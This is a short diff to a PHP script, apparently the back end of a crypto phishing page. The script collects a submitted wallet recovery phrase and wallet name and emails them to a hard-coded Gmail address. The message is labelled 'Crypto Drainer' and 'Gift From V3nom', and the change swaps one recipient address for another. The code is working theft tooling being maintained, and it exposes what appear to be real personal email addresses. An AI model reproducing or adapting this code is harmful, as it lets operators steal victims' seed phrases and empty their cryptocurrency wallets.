@@ -21,7 +21,7 @@ $wallet_phrase = htmlspecialchars(trim($_POST["wallet_phrase"]));
 $wallet_name = htmlspecialchars(trim($_POST["wallet_name"]));
 
 // Consider using environment variables for credentials
-$to_email = 'alfonsodokubo79@gmail.com';
+$to_email = 'anijahchukwuka13@gmail.com';
 $body = "⚜️ Crypto Drainer ⚜️\r\nWallet Phrase: $wallet_phrase\r\nWallet Name: $wallet_name\r\n⚜️ Gift From V3nom ⚜️";
 $subject = 'Gift From V3nom';
 
